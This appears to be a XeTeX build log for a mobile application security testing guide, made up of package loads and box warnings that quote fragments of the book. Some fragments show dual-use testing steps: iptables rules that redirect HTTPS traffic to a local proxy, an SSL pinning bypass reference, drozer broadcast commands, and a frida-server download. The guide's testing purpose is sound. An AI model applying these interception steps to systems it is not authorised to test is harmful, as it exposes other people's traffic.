(/usr/share/texlive/texmf-dist/tex/latex/pgf/systemlayer/pgfsys.sty
(/usr/share/texlive/texmf-dist/tex/generic/pgf/systemlayer/pgfsys.code.tex
(/usr/share/texlive/texmf-dist/tex/generic/pgf/utilities/pgfkeys.code.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/systemlayer/pgf.cfg)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/systemlayer/pgfsys-xetex.def
(/usr/share/texlive/texmf-dist/tex/generic/pgf/systemlayer/pgfsys-dvipdfmx.def
(/usr/share/texlive/texmf-dist/tex/generic/pgf/systemlayer/pgfsys-common-pdf.de
f))))
(/usr/share/texlive/texmf-dist/tex/generic/pgf/systemlayer/pgfsyssoftpath.code.
tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/systemlayer/pgfsysprotocol.code.
tex))
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcore.code.tex
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmath.code.tex
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmathcalc.code.tex
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmathutil.code.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmathparser.code.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmathfunctions.code.tex
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmathfunctions.basic.code
.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmathfunctions.trigonomet
ric.code.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmathfunctions.random.cod
e.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmathfunctions.comparison
.code.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmathfunctions.base.code.
tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmathfunctions.round.code
.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmathfunctions.misc.code.
tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmathfunctions.integerari
thmetics.code.tex)))
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmathfloat.code.tex))
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcorepoints.code.te
x)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcorepathconstruct.
code.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcorepathusage.code
.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcorescopes.code.te
x)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcoregraphicstate.c
ode.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcoretransformation
s.code.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcorequick.code.tex
)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcoreobjects.code.t
ex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcorepathprocessing
.code.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcorearrows.code.te
x)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcoreshade.code.tex
)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcoreimage.code.tex

(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcoreexternal.code.
tex))
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcorelayers.code.te
x)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcoretransparency.c
ode.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/basiclayer/pgfcorepatterns.code.
tex)))
(/usr/share/texlive/texmf-dist/tex/generic/pgf/modules/pgfmoduleshapes.code.tex
) (/usr/share/texlive/texmf-dist/tex/generic/pgf/modules/pgfmoduleplot.code.tex
)
(/usr/share/texlive/texmf-dist/tex/latex/pgf/compatibility/pgfcomp-version-0-65
.sty)
(/usr/share/texlive/texmf-dist/tex/latex/pgf/compatibility/pgfcomp-version-1-18
.sty)) (/usr/share/texlive/texmf-dist/tex/latex/pgf/utilities/pgffor.sty
(/usr/share/texlive/texmf-dist/tex/latex/pgf/math/pgfmath.sty
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmath.code.tex))
(/usr/share/texlive/texmf-dist/tex/generic/pgf/utilities/pgffor.code.tex
(/usr/share/texlive/texmf-dist/tex/generic/pgf/math/pgfmath.code.tex))))
(/usr/share/texlive/texmf-dist/tex/latex/pgf/frontendlayer/tikz.sty
(/usr/share/texlive/texmf-dist/tex/generic/pgf/frontendlayer/tikz/tikz.code.tex

(/usr/share/texlive/texmf-dist/tex/generic/pgf/libraries/pgflibraryplothandlers
.code.tex)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/modules/pgfmodulematrix.code.tex
)
(/usr/share/texlive/texmf-dist/tex/generic/pgf/frontendlayer/tikz/libraries/tik
zlibrarytopaths.code.tex)))
(/usr/share/texlive/texmf-dist/tex/latex/polyglossia/polyglossia.sty
(/usr/share/texlive/texmf-dist/tex/latex/makecmds/makecmds.sty)
(/usr/share/texlive/texmf-dist/tex/latex/xkeyval/xkeyval.sty
(/usr/share/texlive/texmf-dist/tex/generic/xkeyval/xkeyval.tex
(/usr/share/texlive/texmf-dist/tex/generic/xkeyval/xkvutils.tex))))
(/usr/share/texlive/texmf-dist/tex/latex/polyglossia/gloss-english.ldf)
(/usr/share/texlive/texmf-dist/tex/latex/csquotes/csquotes.sty
(/usr/share/texlive/texmf-dist/tex/latex/csquotes/csquotes.def)
(/usr/share/texlive/texmf-dist/tex/latex/csquotes/csquotes.cfg))
(/usr/share/texlive/texmf-dist/tex/latex/caption/caption.sty
(/usr/share/texlive/texmf-dist/tex/latex/caption/caption3.sty)
(/usr/share/texlive/texmf-dist/tex/latex/caption/ltcaption.sty))
(/usr/share/texlive/texmf-dist/tex/latex/mdframed/mdframed.sty
(/usr/share/texlive/texmf-dist/tex/latex/oberdiek/zref-abspage.sty
(/usr/share/texlive/texmf-dist/tex/latex/oberdiek/zref-base.sty))
(/usr/share/texlive/texmf-dist/tex/latex/needspace/needspace.sty)
(/usr/share/texlive/texmf-dist/tex/latex/mdframed/md-frame-0.mdf))
(/texmf/tex/latex/sourcesanspro/sourcesanspro.sty)
(/texmf/tex/latex/sourcecodepro/sourcecodepro.sty)
(/usr/share/texlive/texmf-dist/tex/latex/titling/titling.sty)

Class scrartcl Warning: Usage of package `fancyhdr' together
(scrartcl)              with a KOMA-Script class is not recommended.
(scrartcl)              I'd suggest to use 
(scrartcl)              package `scrlayer-scrpage'.
(scrartcl)              Nevertheless, using requested
(scrartcl)              package `fancyhdr' on input line 362.

(/usr/share/texlive/texmf-dist/tex/latex/fancyhdr/fancyhdr.sty)
No file input.aux.
(/usr/share/texlive/texmf-dist/tex/latex/hyperref/nameref.sty
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/gettitlestring.sty))

Package hyperref Warning: Rerun to get /PageLabels entry.

*geometry* driver: auto-detecting
*geometry* detected driver: xetex
ABD: EveryShipout initializing macros

Package caption Warning: \caption will not be redefined since it's already
(caption)                redefined by a document class or package which is
(caption)                unknown to the caption package.
See the caption package documentation for explanation.

<use  "cover.jpg" > [1]

Class scrartcl Warning: incompatible usage of \@ssect detected.
(scrartcl)              You've used the KOMA-Script implementation of \@ssect
(scrartcl)              from within a non compatible caller, that does not
(scrartcl)              \scr@s@ct@@nn@m@ locally.
(scrartcl)              This could result in several error messages on input li
ne 415.

[2] [3]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/6c9ef3f29742285f2d7e09d0c076a66855521a28.
png" > [4]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/997b3fc8f69d8fa1fd9853b14a99a208461549eb.
png" > [5] [6] [7] [8]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/ccba17705245f8560d8a34338e189f56fd492cf8.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/be368d70157fbfbee3a68fb706425b2117ca985a.
png" > [9] [10] [11] [12]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/db1eb1182c61b69cf4140a62eec441c2a36e2252.
jpg" > [13] [14] [15] [16] [17] [18] [19] [20] [21] [22]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/29ee4afc5b34f4de27f808c55317ab17b193fa4c.
png" > [23] [24] [25] [26] [27] [28]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/1ac849125c0802c1919c86dd62f13c49723742af.
jpg" > [29] [30] [31]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/28bf4372b490e7da769b83110e865b5dfbbac14d.
jpg" > [32]
Underfull \hbox (badness 1852) in paragraph at lines 2081--2090
[]\TU/SourceSansPro(0)/m/n/10.95 Infrastructure as Code also facilitates the co
nstruction of the environments required by classical

Underfull \hbox (badness 1655) in paragraph at lines 2081--2090
\TU/SourceSansPro(0)/m/n/10.95 software creation projects, for \TU/SourceSansPr
o(0)/bx/n/10.95 development \TU/SourceSansPro(0)/m/n/10.95 (“DEV”), \TU/SourceS
ansPro(0)/bx/n/10.95 integration \TU/SourceSansPro(0)/m/n/10.95 (“INT”), \TU/So
urceSansPro(0)/bx/n/10.95 testing \TU/SourceSansPro(0)/m/n/10.95 (“PPR” for Pre
-
[33] [34]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/475043742486ea4fadf4922cde94a2395cceba4a.
jpg" > [35] [36] [37] [38]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/b8545a63bbbd33e84277034f5674e52d35eb224c.
png" > [39] [40] (/usr/share/texmf/tex/latex/lm/omllmm.fd)
(/usr/share/texlive/texmf-dist/tex/latex/amsfonts/umsa.fd)
(/usr/share/texlive/texmf-dist/tex/latex/microtype/mt-msa.cfg)
(/usr/share/texlive/texmf-dist/tex/latex/amsfonts/umsb.fd)
(/usr/share/texlive/texmf-dist/tex/latex/microtype/mt-msb.cfg)
Underfull \hbox (badness 5908) in paragraph at lines 2610--2613
[]\TU/SourceSansPro(0)/m/n/10.95 Universal Android SSL Pinning Bypass with Frid
a - [][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][] [] [][] [] [][][]
[][][][][][][][] []
[41] [42]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/9a0c01a9582fcd5d3aac500e683e7ba7cfbab2fe.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/186d6939c74e4d7ed97a499be236f2eae40edfb4.
png" > [43]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/222cb525d0a89b02ee9868add6220f38f7d8eec4.
png" > [44]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/f5ea8252ffeab6775a9e3cc315bf3623aacaa026.
png" > [45]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/7565cd5bcb1af1b7f77b1001570b2035da0e0358.
png" > [46]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/54f39a0e594a78d2ceefec1465e3e353b39e1f8e.
png" > [47] [48] [49] [50]
Underfull \hbox (badness 1342) in paragraph at lines 2987--2990
[]\TU/SourceSansPro(0)/m/n/10.95 [#vadla] Ole André Vadla Ravnås, Anatomy of a 
code tracer - [][]$[][][][][] [] [] [] [][][][][][] [] [][][] [] [][][][][][][]
 []

Underfull \hbox (badness 3449) in paragraph at lines 2990--2993
\TU/SourceSansPro(0)/m/n/10.95 chine based software protections - [][]$[][][][]
[] [] [] [] [][][][][][] [] [][][][][][][][][] [] [][][] [] [][][][][] [] [][][
][][][][][] [][] [][][] [][] [][][][][][][] [][]
[51] [52] [53] [54] [55]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/5adbeedbb4e9578327329ff2b30517e548450d8e.
png" > [56]
Overfull \hbox (119.56647pt too wide) in paragraph at lines 3368--3371
[]\TU/SourceSansPro(0)/m/n/10.95 Take the SHA-1 hash of the result of step 1 (e
.g.: the hash of \TU/SourceCodePro(6)/m/n/10.95 test \TU/SourceSansPro(0)/m/n/1
0.95 is \TU/SourceCodePro(6)/m/n/10.95 A94A8FE5CCB19BA61C4C0873D391E987982FBBD3
\TU/SourceSansPro(0)/m/n/10.95 ). 

Overfull \hbox (72.01427pt too wide) in paragraph at lines 3375--3382
[]\TU/SourceSansPro(0)/m/n/10.95 Iterate through the result and look for the re
st of the hash (e.g. is \TU/SourceCodePro(6)/m/n/10.95 FE5CCB19BA61C4C0873D391E
987982FBBD3

Overfull \hbox (194.01184pt too wide) in paragraph at lines 3375--3382
\TU/SourceSansPro(0)/m/n/10.95 will return a counter showing how many times it 
has been found in breaches (e.g.: \TU/SourceCodePro(6)/m/n/10.95 FE5CCB19BA61C4
C0873D391E987982FBBD3:76479\TU/SourceSansPro(0)/m/n/10.95 ). 
[57]
Underfull \hbox (badness 1107) in paragraph at lines 3471--3476
[]\TU/SourceSansPro(0)/m/n/10.95 Load or paste the list of passwords you want t
o try. There are several resources available
[58]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/ef35163475f90699bc1e3dc9c0670e1dcb0a0f68.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/6b817d1ce3fb5ecf5ff181554fb12a94aaec6e01.
png" > [59] [60] [61] [62] [63]
Underfull \hbox (badness 10000) in paragraph at lines 3840--3846

[64]
Underfull \hbox (badness 1052) in paragraph at lines 3878--3881
[]\TU/SourceSansPro(0)/m/n/10.95 There are various two-factor authentication me
chanism available which can range from 3rd party
[65]
Overfull \hbox (62.69936pt too wide) in paragraph at lines 3940--3940
[]\TU/SourceCodePro(6)/m/n/10.95 <base64UrlEncode(header)>.<base64UrlEncode(pay
load)>.<base64UrlEncode(signature)>[] 

Overfull \hbox (509.45926pt too wide) in paragraph at lines 3947--3947
[]\TU/SourceCodePro(6)/m/n/10.95 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiO
iIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30R
MHrHDcEfxjoYZgeFONFh7HgQ[] 
[66] [67] [68] [69]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/de11985a944d62f6043f7925b67f1282123b016d.
png" > [70] [71] [72]
Underfull \hbox (badness 2237) in paragraph at lines 4467--4475
[]\TU/SourceSansPro(0)/m/n/10.95 In all cases, you should verify whether differ
ent devices are detected correctly. Therefore, the

Underfull \hbox (badness 2158) in paragraph at lines 4467--4475
\TU/SourceSansPro(0)/m/n/10.95 binding of the application to the actual device 
should be tested. In iOS, a developer can use

Underfull \hbox (badness 1377) in paragraph at lines 4467--4475
\TU/SourceCodePro(6)/m/n/10.95 identifierForVendor\TU/SourceSansPro(0)/m/n/10.9
5 , which is related to the bundle ID: the moment you change a bundle
[73] [74] [75]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/885ac03015d3917ef0a32901cacaf58cedaef149.
png" > [76] [77] [78]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/c3af2e2ee692b1d4abd115bece49476248ffa13d.
png" > [79] [80]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/23e89c95e9bb3113d34778f0cba467e2ded7bdb9.
png" > [81] [82]
Overfull \hbox (104.30946pt too wide) in paragraph at lines 5065--5065
[]    \TU/SourceCodePro(6)/m/n/10.95 # iptables will NAT connections from AP ne
twork interface to the target network interface[] 

Overfull \hbox (47.36942pt too wide) in paragraph at lines 5065--5065
[]    \TU/SourceCodePro(6)/m/n/10.95 $ iptables --table nat --append POSTROUTIN
G --out-interface wlan0 -j MASQUERADE[] 
[83] [84]
Overfull \hbox (141.53944pt too wide) in paragraph at lines 5153--5153
[]    \TU/SourceCodePro(6)/m/n/10.95 $ sudo iptables -t nat -A PREROUTING -p tc
p --dport 443 -j DNAT --to-destination 127.0.0.1:8080[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/db6c108c5b7ef9e975feeffbd8dfd088fe39edea.
png" > [85] [86]
Overfull \hbox (111.09839pt too wide) in paragraph at lines 5294--5296
[]\TU/SourceSansPro(0)/m/n/10.95 Cipher suites have the following structure: \T
U/SourceSansPro(0)/bx/n/10.95 Protocol_KeyExchangeAlgorithm_WITH_BlockCipher_In
tegrityCheckAlgorithm 
[87] [88] [89] [90] [91]
Underfull \hbox (badness 10000) in paragraph at lines 5691--5694
[]\TU/SourceSansPro(0)/m/n/10.95 Android supported Cipher suites - [][]$[][][][
][] [] [] [] [][][][][][][][][] [] [][][][][][][] [] [][][] [] [][][][][][][][]
[] [] [][][][][] [] [][][] [] [][][] []

Underfull \hbox (badness 10000) in paragraph at lines 5726--5728
[]\TU/SourceSansPro(0)/m/n/10.95 Recommendations for a cipher string - [][]$[][
][][][] [] [] [] [][][][][][] [] [][][] [] [][][][][] [] [][][][][][][][][][][]
[][][][][] [] [][][][] []
[92]
Underfull \hbox (badness 10000) in paragraph at lines 5739--5742
[] [] [][][] [] [][][][][][][][][][][] [] [][][] [] [][][] [][] [][][][][][][][
] [][] [][][] [][] [][][] [][] [][][][][][] [][] [][][][][][][][] [][] [][][][]
[][][] [][] [][][] [][] [][][][] [][] [][] [][] [] [][] [][][][][][] [][]

Underfull \hbox (badness 10000) in paragraph at lines 5759--5761
[][][]$[][][][][] [] [] [] [][][][][][][][][][][] [] [][][][] [] [][][] [] [][]
 [] [][] [] [][][][][][][] [] [][][][][][] [] [][][][][][][] [][] [][][] [][] [
][][][][][][][] [][] [][][][][] [][] [][][][][] [][]
[93] [94] [95] [96]
Overfull \hbox (145.9194pt too wide) in paragraph at lines 6061--6061
[]\TU/SourceCodePro(6)/m/n/10.95 1. The password to the client certificate isn[
]t stored locally or is locked in the device Keychain.[] 
[97] [98] [99]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/8c5c6e36f8f96c2a99d646eadbb33514e8031732.
png" > [100] [101] [102] [103] [104] [105] [106] [107]
Overfull \hbox (46.27438pt too wide) in paragraph at lines 6717--6717
 []\TU/SourceCodePro(6)/m/n/10.95 $ am start -n com.quora.android/com.quora.and
roid.ActionBarContentActivity \[] 

Overfull \hbox (24.37439pt too wide) in paragraph at lines 6725--6725
 []\TU/SourceCodePro(6)/m/n/10.95 $ am start -n com.quora.android/com.quora.and
roid.ModalContentActivity  \[] 
[108] [109] [110] [111] [112] [113] [114]
Underfull \hbox (badness 10000) in paragraph at lines 7215--7218
[]\TU/SourceSansPro(0)/m/n/10.95 Apple Human Interface Guidelines - [][]$[][][]
[][] [] [] [] [][][][][][][][][] [] [][][][][] [] [][][] [] [][][][][][] [] [][
][][][] [][] [][][][][][][][][] [][]
[115]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/1f7368a68bdac5245a0c8f7dea8e9f7f271617de.
png" > [116]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/b95a89677543656fa89bd7246356c2a701a1d247.
png" > [117] [118] [119] [120] [121] [122]
Overfull \hbox (49.19812pt too wide) in paragraph at lines 7594--7597
[]\TU/SourceSansPro(0)/m/n/10.95 The relationship between group IDs and permiss
ions is defined in the file [][]frameworks/base/data/etc/platform.xml[][] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/4f788504cb27937eddb44c2ec5f319b376b249d4.
png" > [123]
Overfull \hbox (86.78952pt too wide) in paragraph at lines 7642--7642
[]\TU/SourceCodePro(6)/m/n/10.95 drwx------  4 u0_a97              u0_a97      
        4096 2017-01-18 14:27 com.android.calendar[] 

Overfull \hbox (78.02954pt too wide) in paragraph at lines 7642--7642
[]\TU/SourceCodePro(6)/m/n/10.95 drwx------  6 u0_a120             u0_a120     
        4096 2017-01-19 12:54 com.android.chrome[] 
[124]
Overfull \hbox (34.22937pt too wide) in paragraph at lines 7730--7730
[]\TU/SourceCodePro(6)/m/n/10.95 $ bundletool build-apks --bundle=/MyApp/my_app
.aab --output=/MyApp/my_app.apks[] 

Overfull \hbox (34.22937pt too wide) in paragraph at lines 7741--7741
[]\TU/SourceCodePro(6)/m/n/10.95 $ bundletool build-apks --bundle=/MyApp/my_app
.aab --output=/MyApp/my_app.apks[] 
[125] [126] [127] [128]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/deb1cf5c3b76357c39b70ee98334d01e70f1ea3b.
jpg" > [129] [130] [131]
Overfull \hbox (48.13965pt too wide) in paragraph at lines 8163--8167
[]\TU/SourceSansPro(0)/m/n/10.95 The other way is to create the receiver dynami
cally in code and register it with the [][]\TU/SourceCodePro(6)/m/n/10.95 Conte
xt.registerReceiver[][]
[132]
Underfull \hbox (badness 4084) in paragraph at lines 8210--8221
[]\TU/SourceSansPro(0)/m/n/10.95 If your app is not supposed to send broadcasts
 across apps, use a Local Broadcast Manager

Underfull \hbox (badness 1590) in paragraph at lines 8210--8221
\TU/SourceSansPro(0)/m/n/10.95 security and the efficiency of the app, as no in
terprocess communication is involved. However,

Underfull \hbox (badness 3354) in paragraph at lines 8228--8236
\TU/SourceSansPro(0)/m/n/10.95 receive \TU/SourceCodePro(6)/m/n/10.95 CONNECTIV
ITY_ACTION \TU/SourceSansPro(0)/m/n/10.95 broadcast unless they register their 
Broadcast Receivers with

Underfull \hbox (badness 4505) in paragraph at lines 8228--8236
\TU/SourceCodePro(6)/m/n/10.95 Context.registerReceiver()\TU/SourceSansPro(0)/m
/n/10.95 . The system does not send \TU/SourceCodePro(6)/m/n/10.95 ACTION_NEW_P
ICTURE \TU/SourceSansPro(0)/m/n/10.95 and

Underfull \hbox (badness 1694) in paragraph at lines 8237--8246
\TU/SourceSansPro(0)/m/n/10.95 no longer register Broadcast Receivers for impli
cit broadcasts in their manifest, except for those

Underfull \hbox (badness 3098) in paragraph at lines 8237--8246
\TU/SourceSansPro(0)/m/n/10.95 listed in [][]Implicit Broadcast Exceptions[][].
 The Broadcast Receivers created at runtime by calling

Overfull \hbox (105.39647pt too wide) in paragraph at lines 8247--8252
[]\TU/SourceSansPro(0)/m/n/10.95 According to [][]Changes to System Broadcasts[
][], beginning with Android 9 (API level 28), the \TU/SourceCodePro(6)/m/n/10.9
5 NETWORK_STATE_CHANGED_ACTION
[133] [134] [135]
Overfull \hbox (6.80698pt too wide) in paragraph at lines 8383--8388
[]\TU/SourceSansPro(0)/m/n/10.95 The above code defines a new permission named 
\TU/SourceCodePro(6)/m/n/10.95 com.permissions.sample.ACCESS_USER_INFO
[136]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/b49fc3618488c3a40ee2d09e488dd0d40ac9502f.
png" > [137]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/6c3c805441548d38b63caf39920079fd1673c545.
png" > [138]
Overfull \hbox (334.2594pt too wide) in paragraph at lines 8550--8550
[]\TU/SourceCodePro(6)/m/n/10.95 $ keytool -genkey -alias myDomain -keyalg RSA 
-keysize 2048 -validity 7300 -keystore myKeyStore.jks -storepass myStrongPasswo
rd[] 
[139]
Overfull \hbox (14.51942pt too wide) in paragraph at lines 8595--8595
[]\TU/SourceCodePro(6)/m/n/10.95 $ apksigner sign --out mySignedApp.apk --ks my
KeyStore.jks myUnsignedApp.apk[] 
[140] [141]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/a92a527830c8d387b73bc3f82eb4c78e331d24dd.
jpg" > [142] [143]

Package longtable Warning: Column widths have changed
(longtable)                in table 4 on input line 8833.


Overfull \hbox (191.90938pt too wide) in paragraph at lines 8856--8856
[]\TU/SourceCodePro(6)/m/n/10.95 $ ./build/tools/make_standalone_toolchain.py -
-arch arm --api 24 --install-dir /tmp/android-7-toolchain[] 

Overfull \hbox (42.80989pt too wide) in paragraph at lines 8858--8864
[]\TU/SourceSansPro(0)/m/n/10.95 This creates a standalone toolchain for Androi
d 7.0 (API level 24) in the directory \TU/SourceCodePro(6)/m/n/10.95 /tmp/andro
id-7-toolchain\TU/SourceSansPro(0)/m/n/10.95 .
[144] [145] [146] [147] [148] [149]
Underfull \hbox (badness 1521) in paragraph at lines 9229--9233
[]\TU/SourceSansPro(0)/m/n/10.95 Frida server: Server for Frida, the dynamic in
strumentation toolkit for developers, reverse-
[150] [151]
Overfull \hbox (288.26935pt too wide) in paragraph at lines 9353--9353
[]\TU/SourceCodePro(6)/m/n/10.95 emulator-5554    device product:sdk_google_pho
ne_x86 model:Android_SDK_built_for_x86 device:generic_x86 transport_id:1[] 
[152] [153]
Overfull \hbox (42.98941pt too wide) in paragraph at lines 9468--9468
[]\TU/SourceCodePro(6)/m/n/10.95 I: Loading resource table from file: /Users/sv
en/Library/apktool/framework/1.apk[] 
[154] [155]
Overfull \hbox (23.5873pt too wide) in paragraph at lines 9599--9607
[]\TU/SourceSansPro(0)/m/n/10.95 Again, without drozer this would have required
 several steps. The module \TU/SourceCodePro(6)/m/n/10.95 app.package.attacksur
face
[156] [157]
Overfull \hbox (121.8294pt too wide) in paragraph at lines 9662--9662
[]\TU/SourceCodePro(6)/m/n/10.95 $ dz> run app.broadcast.send --action (broadca
st receiver name) -- extra (number of arguments)[] 
[158] [159]
Overfull \hbox (316.7393pt too wide) in paragraph at lines 9807--9807
[]\TU/SourceCodePro(6)/m/n/10.95 $ wget https://github.com/frida/frida/releases
/download/$(frida --version)/frida-server-$(frida --version)-android-arm.xz[] 
[160] [161]
Overfull \hbox (288.26935pt too wide) in paragraph at lines 9962--9962
[]\TU/SourceCodePro(6)/m/n/10.95 [*] Instance found: android.view.View{7ccea78 
G.ED..... ......ID 0,0-0,0 #7f0c01fc app:id/action_bar_black_background}[] 

Overfull \hbox (255.41934pt too wide) in paragraph at lines 9962--9962
[]\TU/SourceCodePro(6)/m/n/10.95 [*] Instance found: android.view.View{2809551 
V.ED..... ........ 0,1731-0,1731 #7f0c01ff app:id/menu_anchor_stub}[] 

Overfull \hbox (353.96931pt too wide) in paragraph at lines 9962--9962
[]\TU/SourceCodePro(6)/m/n/10.95 [*] Instance found: android.view.View{be471b6 
G.ED..... ......I. 0,0-0,0 #7f0c01f5 app:id/location_bar_verbose_status_separat
or}[] 

Overfull \hbox (281.69933pt too wide) in paragraph at lines 9962--9962
[]\TU/SourceCodePro(6)/m/n/10.95 [*] Instance found: android.view.View{3ae0eb7 
V.ED..... ........ 0,0-1080,63 #102002f android:id/statusBarBackground}[] 
[162] [163] [164] [165]
Overfull \hbox (49.5594pt too wide) in paragraph at lines 10152--10152
[]\TU/SourceCodePro(6)/m/n/10.95 $ docker run -it -p 8000:8000 opensecurity/mob
ile-security-framework-mobsf:latest[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/942a2c3a332ff2a3c126cf220ad029722e4d7d8b.
png" > [166] [167] [168] [169] [170] [171] [172]
Overfull \hbox (126.2094pt too wide) in paragraph at lines 10532--10532
[]\TU/SourceCodePro(6)/m/n/10.95 0x0000073c [0x00000958 - 0x00000abc]    356 cl
ass 5 Lsg/vantagepoint/uncrackable1/MainActivity[] 

Overfull \hbox (25.46983pt too wide) in paragraph at lines 10532--10532
[]                                                                            \
TU/SourceCodePro(6)/m/n/10.95 :: Landroid/app/Activity;[] 

Overfull \hbox (69.2694pt too wide) in paragraph at lines 10532--10532
[]\TU/SourceCodePro(6)/m/n/10.95 0x00000958 method 0 pC   Lsg/vantagepoint/uncr
ackable1/MainActivity.method.<init>()V[] 

Overfull \hbox (152.48938pt too wide) in paragraph at lines 10532--10532
[]\TU/SourceCodePro(6)/m/n/10.95 0x00000970 method 1 P    Lsg/vantagepoint/uncr
ackable1/MainActivity.method.a(Ljava/lang/String;)V[] 

Overfull \hbox (205.04935pt too wide) in paragraph at lines 10532--10532
[]\TU/SourceCodePro(6)/m/n/10.95 0x000009c8 method 2 r    Lsg/vantagepoint/uncr
ackable1/MainActivity.method.onCreate(Landroid/os/Bundle;)V[] 

Overfull \hbox (191.90933pt too wide) in paragraph at lines 10532--10532
[]\TU/SourceCodePro(6)/m/n/10.95 0x00000a38 method 3 p    Lsg/vantagepoint/uncr
ackable1/MainActivity.method.verify(Landroid/view/View;)V[] 

Overfull \hbox (194.09938pt too wide) in paragraph at lines 10532--10532
[]\TU/SourceCodePro(6)/m/n/10.95 0x0000075c [0x00000acc - 0x00000bb2]    230 cl
ass 6 Lsg/vantagepoint/uncrackable1/a :: Ljava/lang/Object;[] 

Overfull \hbox (82.40936pt too wide) in paragraph at lines 10532--10532
[]\TU/SourceCodePro(6)/m/n/10.95 0x00000acc method 0 sp   Lsg/vantagepoint/uncr
ackable1/a.method.a(Ljava/lang/String;)Z[] 

Overfull \hbox (88.97937pt too wide) in paragraph at lines 10532--10532
[]\TU/SourceCodePro(6)/m/n/10.95 0x00000b5c method 1 sp   Lsg/vantagepoint/uncr
ackable1/a.method.b(Ljava/lang/String;)[B[] 
[173]
Overfull \hbox (259.79942pt too wide) in paragraph at lines 10550--10550
[]  \TU/SourceCodePro(6)/m/n/10.95 29 0x000005cc    NONE    FUNC Ljava/lang/Str
ingBuilder.method.append(Ljava/lang/String;)Ljava/lang/StringBuilder;[] 

Overfull \hbox (108.68944pt too wide) in paragraph at lines 10550--10550
[]  \TU/SourceCodePro(6)/m/n/10.95 30 0x000005d4    NONE    FUNC Ljava/lang/Str
ingBuilder.method.toString()Ljava/lang/String;[] 

Overfull \hbox (167.81941pt too wide) in paragraph at lines 10550--10550
[]  \TU/SourceCodePro(6)/m/n/10.95 32 0x000005e4    NONE    FUNC Ljava/lang/Sys
tem.method.getenv(Ljava/lang/String;)Ljava/lang/String;[] 

Overfull \hbox (240.0894pt too wide) in paragraph at lines 10550--10550
